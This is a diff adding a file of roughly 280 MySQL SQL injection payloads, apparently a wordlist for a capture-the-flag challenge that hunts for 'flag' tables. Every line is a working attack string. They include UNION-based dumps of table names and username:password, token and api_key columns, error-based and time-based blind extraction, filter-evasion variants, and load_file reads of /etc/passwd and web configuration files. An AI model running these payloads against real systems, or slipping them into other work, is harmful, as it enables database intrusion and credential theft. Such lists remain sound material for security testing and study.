@@ -1,0 +1,283 @@
+55') -- -
+55') -- 
+55') #
+55') /*
+55' -- -
+55' #
+55" -- -
+55") -- -
+55 -- -
+55') OR '1'='1' -- -
+55') OR 1=1 -- -
+55') OR 1=1 #
+55' OR '1'='1
+55' OR 1=1 -- -
+55') AND 1=1 -- -
+55') AND 1=2 -- -
+55') ORDER BY 1 -- -
+55') ORDER BY 2 -- -
+55') ORDER BY 3 -- -
+55') ORDER BY 4 -- -
+55') ORDER BY 5 -- -
+55') ORDER BY 6 -- -
+55') ORDER BY 7 -- -
+55') ORDER BY 8 -- -
+55') ORDER BY 9 -- -
+55') ORDER BY 10 -- -
+55' ORDER BY 1 -- -
+55' ORDER BY 2 -- -
+55' ORDER BY 3 -- -
+55' ORDER BY 4 -- -
+55' ORDER BY 5 -- -
+55") ORDER BY 1 -- -
+55") ORDER BY 2 -- -
+55") ORDER BY 3 -- -
+55") ORDER BY 4 -- -
+55") ORDER BY 5 -- -
+55') UNION SELECT NULL -- -
+55') UNION SELECT NULL,NULL -- -
+55') UNION SELECT NULL,NULL,NULL -- -
+55') UNION SELECT NULL,NULL,NULL,NULL -- -
+55') UNION SELECT NULL,NULL,NULL,NULL,NULL -- -
+55') UNION SELECT 1 -- -
+55') UNION SELECT 1,2 -- -
+55') UNION SELECT 1,2,3 -- -
+55') UNION SELECT 1,2,3,4 -- -
+55') UNION SELECT 1,2,3,4,5 -- -
+55') UNION SELECT 1,2,3,4,5,6 -- -
+99999') UNION SELECT 1,2,3 -- -
+99999') UNION SELECT 1,2,3,4 -- -
+99999') UNION SELECT 1,2,3,4,5 -- -
+99999') UNION SELECT 1,2,3,4,5,6 -- -
+99999') UNION SELECT NULL,NULL,NULL -- -
+99999') UNION SELECT NULL,NULL,NULL,NULL -- -
+99999' UNION SELECT 1,2,3 -- -
+99999' UNION SELECT 1,2,3,4 -- -
+99999' UNION SELECT 1,2,3,4,5 -- -
+99999") UNION SELECT 1,2,3 -- -
+99999") UNION SELECT 1,2,3,4 -- -
+99999') UNION SELECT 1,database(),3 -- -
+99999') UNION SELECT 1,database(),3,4 -- -
+99999') UNION SELECT 1,2,database() -- -
+99999') UNION SELECT database(),2,3 -- -
+99999') UNION SELECT 1,user(),3 -- -
+99999') UNION SELECT 1,version(),3 -- -
+99999') UNION SELECT 1,@@version,3 -- -
+99999') UNION SELECT 1,@@datadir,3 -- -
+99999') UNION SELECT 1,@@hostname,3 -- -
+99999') UNION SELECT 1,@@global.secure_file_priv,3 -- -
+99999') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
+99999') UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() -- -
+99999') UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- -
+99999') UNION SELECT 1,group_concat(table_name SEPARATOR 0x7c),3 FROM information_schema.tables WHERE table_schema=database() -- -
+99999') UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -
+99999') UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag' -- -
+99999') UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flags' -- -
+99999') UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='secret' -- -
+99999') UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='products' -- -
+99999') UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='admin' -- -
+99999') UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='members' -- -
+99999') UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=database() -- -
+99999') UNION SELECT 1,flag,3 FROM flag -- -
+99999') UNION SELECT 1,flag,3 FROM flags -- -
+99999') UNION SELECT 1,2,flag FROM flag -- -
+99999') UNION SELECT flag,2,3 FROM flag -- -
+99999') UNION SELECT 1,flag,3,4 FROM flag -- -
+99999') UNION SELECT 1,secret,3 FROM secret -- -
+99999') UNION SELECT 1,value,3 FROM flag -- -
+99999') UNION SELECT 1,data,3 FROM flag -- -
+99999') UNION SELECT 1,content,3 FROM flag -- -
+99999') UNION SELECT 1,group_concat(flag),3 FROM flag -- -
+99999') UNION SELECT 1,group_concat(secret),3 FROM secret -- -
+99999') UNION SELECT 1,username,3 FROM users -- -
+99999') UNION SELECT 1,password,3 FROM users -- -
+99999') UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -
+99999') UNION SELECT 1,group_concat(username,0x7c,password),3 FROM users -- -
+99999') UNION SELECT 1,email,3 FROM users -- -
+99999') UNION SELECT 1,group_concat(id,0x3a,username,0x3a,password),3 FROM users -- -
+99999') UNION SELECT 1,group_concat(id,0x3a,username,0x3a,password),3 FROM admin -- -
+99999') UNION SELECT 1,group_concat(id,0x3a,username,0x3a,password),3 FROM members -- -
+99999') UNION SELECT 1,load_file('/etc/passwd'),3 -- -
+99999') UNION SELECT 1,load_file('/etc/hosts'),3 -- -
+99999') UNION SELECT 1,load_file('/var/www/html/index.php'),3 -- -
+99999') UNION SELECT 1,load_file('/var/www/html/product.php'),3 -- -
+99999') UNION SELECT 1,load_file('/var/www/html/config.php'),3 -- -
+99999') UNION SELECT 1,load_file('/var/www/html/db.php'),3 -- -
+99999') UNION SELECT 1,load_file('/var/www/html/flag.txt'),3 -- -
+99999') UNION SELECT 1,load_file('/flag.txt'),3 -- -
+99999') UNION SELECT 1,load_file('/flag'),3 -- -
+55') AND SLEEP(3) -- -
+55') AND SLEEP(5) -- -
+55' AND SLEEP(3) -- -
+55") AND SLEEP(3) -- -
+55') AND 1=BENCHMARK(5000000,MD5(1)) -- -
+55') OR SLEEP(3) -- -
+55') AND (SELECT * FROM (SELECT(SLEEP(3)))a) -- -
+55') AND EXTRACTVALUE(1,CONCAT(0x7e,database())) -- -
+55') AND EXTRACTVALUE(1,CONCAT(0x7e,user())) -- -
+55') AND EXTRACTVALUE(1,CONCAT(0x7e,version())) -- -
+55') AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -
+55') AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'))) -- -
+55') AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flag LIMIT 1))) -- -
+55') AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1))) -- -
+55') AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(username,0x3a,password) FROM users))) -- -
+55') AND UPDATEXML(1,CONCAT(0x7e,database()),1) -- -
+55') AND UPDATEXML(1,CONCAT(0x7e,user()),1) -- -
+55') AND UPDATEXML(1,CONCAT(0x7e,version()),1) -- -
+55') AND UPDATEXML(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1) -- -
+55') AND UPDATEXML(1,CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag')),1) -- -
+55') AND UPDATEXML(1,CONCAT(0x7e,(SELECT flag FROM flag LIMIT 1)),1) -- -
+55') AND UPDATEXML(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)),1) -- -
+55') AND UPDATEXML(1,CONCAT(0x7e,(SELECT group_concat(username,0x3a,password) FROM users)),1) -- -
+55') AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
+55') AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
+55') AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
+55') AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
+55') AND IF(1=1,SLEEP(3),0) -- -
+55') AND IF(database()='ctf',SLEEP(3),0) -- -
+55') AND IF(length(database())>1,SLEEP(3),0) -- -
+55') AND IF((SELECT count(*) FROM information_schema.tables WHERE table_schema=database())>0,SLEEP(3),0) -- -
+55') AND IF((SELECT substring(flag,1,1) FROM flag LIMIT 1)='H',SLEEP(3),0) -- -
+55') AND IF((SELECT substring(flag,1,1) FROM flags LIMIT 1)='H',SLEEP(3),0) -- -
+55') AND IF((SELECT substring(flag,1,4) FROM flag LIMIT 1)='HTB{',SLEEP(3),0) -- -
+55') AND IF((SELECT substring(flag,1,4) FROM flag LIMIT 1)='CTF{',SLEEP(3),0) -- -
+55') AND IF((SELECT substring(flag,1,4) FROM flags LIMIT 1)='HTB{',SLEEP(3),0) -- -
+55') AND IF((SELECT substring(flag,1,4) FROM flags LIMIT 1)='CTF{',SLEEP(3),0) -- -
+55') AND IF((SELECT substring(flag,1,4) FROM flag LIMIT 1)='FLAG',SLEEP(3),0) -- -
+55'/**/OR/**/1=1 -- -
+55'/**/UNION/**/SELECT/**/1,2,3 -- -
+55'/**/UNION/**/SELECT/**/1,database(),3 -- -
+55'+UNION+SELECT+1,database(),3 -- -
+55'+UNION+SELECT+1,2,3 -- -
+55' UNION%20SELECT 1,database(),3 -- -
+55')%20UNION%20SELECT%201,database(),3 -- -
+55') UNION SELECT 1,0x48544227,3 -- -
+55') UNION SELECT 1,unhex(hex(database())),3 -- -
+55') UNION SELECT 1,conv(hex(database()),16,10),3 -- -
+55') UNION SELECT 1,mid(database(),1,10),3 -- -
+55') UNION SELECT 1,substr(database(),1,10),3 -- -
+55') UNION SELECT 1,substring(database(),1,10),3 -- -
+55') UNION SELECT 1,lcase(database()),3 -- -
+55') UNION SELECT 1,ucase(database()),3 -- -
+99999') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema!=0x696e666f726d6174696f6e5f736368656d61 -- -
+99999') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema!=0x6d7973716c -- -
+99999') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x6374660000000000 -- -
+99999') UNION SELECT 1,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),3 -- -
+99999') UNION SELECT 1,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()),3 -- -
+99999') UNION SELECT 1,(SELECT group_concat(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_schema=database()),3 -- -
+99999') UNION SELECT 1,schema_name,3 FROM information_schema.schemata -- -
+99999') UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata -- -
+99999') UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1),3 -- -
+99999') UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1,1),3 -- -
+99999') UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 2,1),3 -- -
+99999') UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1 -- -
+99999') UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1 -- -
+99999') UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1 -- -
+99999') UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1 -- -
+99999') UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 4,1 -- -
+99999') UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' LIMIT 0,1 -- -
+99999') UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' LIMIT 1,1 -- -
+99999') UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' LIMIT 2,1 -- -
+99999') UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flag' LIMIT 0,1 -- -
+99999') UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flag' LIMIT 1,1 -- -
+99999') UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flag' LIMIT 2,1 -- -
+55') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables -- -
+55') UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() -- -
+55') UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- -
+99999') UNION SELECT 1,count(*),3 FROM information_schema.tables -- -
+99999') UNION SELECT 1,count(*),3 FROM users -- -
+99999') UNION SELECT 1,count(*),3 FROM flag -- -
+99999') UNION SELECT 1,count(*),3 FROM flags -- -
+55 ORDER BY 1 -- -
+55 ORDER BY 2 -- -
+55 ORDER BY 3 -- -
+55 ORDER BY 4 -- -
+55 ORDER BY 5 -- -
+55 UNION SELECT 1,2,3 -- -
+99999 UNION SELECT 1,database(),3 -- -
+99999 UNION SELECT 1,user(),3 -- -
+99999 UNION SELECT 1,version(),3 -- -
+99999 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
+55 AND SLEEP(3) -- -
+55 AND EXTRACTVALUE(1,CONCAT(0x7e,database())) -- -
+55 AND UPDATEXML(1,CONCAT(0x7e,database()),1) -- -
+55 AND 1=1 -- -
+55 AND 1=2 -- -
+55 OR 1=1 -- -
+55 OR 1=2 -- -
+55;SELECT SLEEP(3) -- -
+55;SELECT database() -- -
+55;SELECT user() -- -
+55;SHOW TABLES -- -
+99999') UNION SELECT 1,group_concat(flag separator '|'),3 FROM flag -- -
+99999') UNION SELECT 1,group_concat(flag separator '|'),3 FROM flags -- -
+99999') UNION SELECT 1,group_concat(flag separator '|'),3,4 FROM flag -- -
+99999') UNION SELECT 1,flag,3 FROM flag LIMIT 0,1 -- -
+99999') UNION SELECT 1,flag,3 FROM flag LIMIT 1,1 -- -
+99999') UNION SELECT 1,flag,3 FROM flags LIMIT 0,1 -- -
+99999') UNION SELECT 1,flag,3 FROM flags LIMIT 1,1 -- -
+99999') UNION SELECT 1,value,3 FROM flags -- -
+99999') UNION SELECT 1,txt,3 FROM flag -- -
+99999') UNION SELECT 1,text,3 FROM flag -- -
+99999') UNION SELECT 1,key,3 FROM flag -- -
+99999') UNION SELECT 1,answer,3 FROM flag -- -
+99999') UNION SELECT 1,result,3 FROM flag -- -
+99999') UNION SELECT 1,passwd,3 FROM users -- -
+99999') UNION SELECT 1,pass,3 FROM users -- -
+99999') UNION SELECT 1,hash,3 FROM users -- -
+99999') UNION SELECT 1,token,3 FROM users -- -
+99999') UNION SELECT 1,api_key,3 FROM users -- -
+99999') UNION SELECT 1,secret_key,3 FROM users -- -
+99999') UNION SELECT 1,group_concat(username,0x3a,password),3 FROM admin -- -
+99999') UNION SELECT 1,group_concat(username,0x3a,passwd),3 FROM admin -- -
+99999') UNION SELECT 1,group_concat(login,0x3a,password),3 FROM users -- -
+99999') UNION SELECT 1,name,3 FROM users -- -
+99999') UNION SELECT 1,id,3 FROM users -- -
+99999') UNION SELECT 1,role,3 FROM users -- -
+99999') UNION SELECT 1,is_admin,3 FROM users -- -
+99999') UNION SELECT 1,privilege,3 FROM users -- -
+99999') UNION SELECT 1,group_concat(id,0x7c,username,0x7c,password,0x7c,role),3 FROM users -- -
+99999') UNION SELECT 1,group_concat(id,0x7c,username,0x7c,password,0x7c,is_admin),3 FROM users -- -
+55') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e,0x41))s), 8446744073709551610, 8446744073709551610))) -- -
+55') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e,0x41))s), 8446744073709551610, 8446744073709551610))) -- -
+55') AND ROW(1,1)>(SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1) -- -
+55') AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1337) -- -
+55') AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),1337) -- -
+55') AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1337) -- -
+55') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,database(),0x7e)) USING utf8))) -- -
+55') OR 1 GROUP BY CONCAT(database(),FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
+99999') UNION SELECT 1,to_base64(flag),3 FROM flag -- -
+99999') UNION SELECT 1,hex(flag),3 FROM flag -- -
+99999') UNION SELECT 1,bin(flag),3 FROM flag -- -
+99999') UNION SELECT 1,to_base64(group_concat(username,0x3a,password)),3 FROM users -- -
+55') AND (SELECT substring(database(),1,1))='a' -- -
+55') AND (SELECT substring(database(),1,1))='b' -- -
+55') AND (SELECT substring(database(),1,1))='c' -- -
+55') AND (SELECT substring(database(),1,1))='d' -- -
+55') AND ASCII(substring((SELECT database()),1,1))>64 -- -
+55') AND ASCII(substring((SELECT database()),1,1))>96 -- -
+55') AND ASCII(substring((SELECT database()),1,1))>100 -- -
+55') AND ASCII(substring((SELECT database()),1,1))=99 -- -
+55') AND (SELECT count(*) FROM flag)>=0 -- -
+55') AND (SELECT count(*) FROM flags)>=0 -- -
+55') AND (SELECT count(*) FROM users)>=0 -- -
+55') AND (SELECT count(*) FROM admin)>=0 -- -
+55') AND (SELECT count(*) FROM secret)>=0 -- -
+55') AND (SELECT count(*) FROM members)>=0 -- -
+55') AND (SELECT count(*) FROM products)>=0 -- -
+55') AND (SELECT count(*) FROM credentials)>=0 -- -
+55') AND (SELECT count(*) FROM accounts)>=0 -- -
+55') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- -
+99999') UNION SELECT 1,group_concat(0x7c,table_name,0x7c),3 FROM information_schema.tables WHERE table_schema=database() -- -
+99999') UNION SELECT 1,group_concat(0x7c,column_name,0x7c),3 FROM information_schema.columns WHERE table_schema=database() -- -
+99999') UNION SELECT 1,group_concat(0x7c,column_name,0x7c),3 FROM information_schema.columns WHERE table_name='flag' -- -
+99999') UNION SELECT 1,group_concat(0x7c,column_name,0x7c),3 FROM information_schema.columns WHERE table_name='flags' -- -
+99999') UNION SELECT 1,group_concat(0x7c,column_name,0x7c),3 FROM information_schema.columns WHERE table_name='users' -- -
+99999') UNION SELECT 1,group_concat(0x7c,column_name,0x7c),3 FROM information_schema.columns WHERE table_name='admin' -- -
+99999') UNION SELECT 1,group_concat(0x7c,column_name,0x7c),3 FROM information_schema.columns WHERE table_name='secret' -- -
+55') UNION ALL SELECT 1,2,3 -- -
+55') UNION ALL SELECT 1,database(),3 -- -
+99999') UNION ALL SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
+99999') UNION ALL SELECT 1,flag,3 FROM flag -- -
+99999') UNION ALL SELECT 1,flag,3 FROM flags -- -
+99999') UNION ALL SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -
